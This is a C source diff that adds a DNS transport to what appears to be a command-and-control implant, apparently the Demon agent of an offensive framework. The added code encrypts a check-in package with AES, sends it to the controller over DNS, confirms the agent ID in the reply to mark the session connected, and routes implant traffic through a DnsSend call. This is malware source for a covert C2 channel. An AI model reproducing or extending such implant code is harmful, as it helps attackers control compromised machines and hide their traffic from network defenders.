@@ -7,6 +7,7 @@
 #include <core/MiniStd.h>
 #include <core/TransportHttp.h>
 #include <core/TransportSmb.h>
+#include <core/TransportDns.h>
 
 #include <crypt/AesCrypt.h>
 
@@ -46,6 +47,25 @@ BOOL TransportInit( )
     }
 #endif
 
+#ifdef TRANSPORT_DNS
+    if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
+    {
+        AESCTX AesCtx = { 0 };
+
+        AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
+        AesXCryptBuffer( &AesCtx, Data, Size );
+
+        if ( Data )
+        {
+            if ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
+            {
+                Instance->Session.Connected = TRUE;
+                Success = TRUE;
+            }
+        }
+    }
+#endif
+
     return Success;
 }
 
@@ -76,6 +96,21 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     if ( SmbSend( &Send ) )
     {
+        return TRUE;
+    }
+
+#endif
+
+#ifdef TRANSPORT_DNS
+
+    if ( DnsSend( &Send, &Resp ) )
+    {
+        if ( RecvData )
+            *RecvData = Resp.Buffer;
+
+        if ( RecvSize )
+            *RecvSize = Resp.Length;
+
         return TRUE;
     }
 
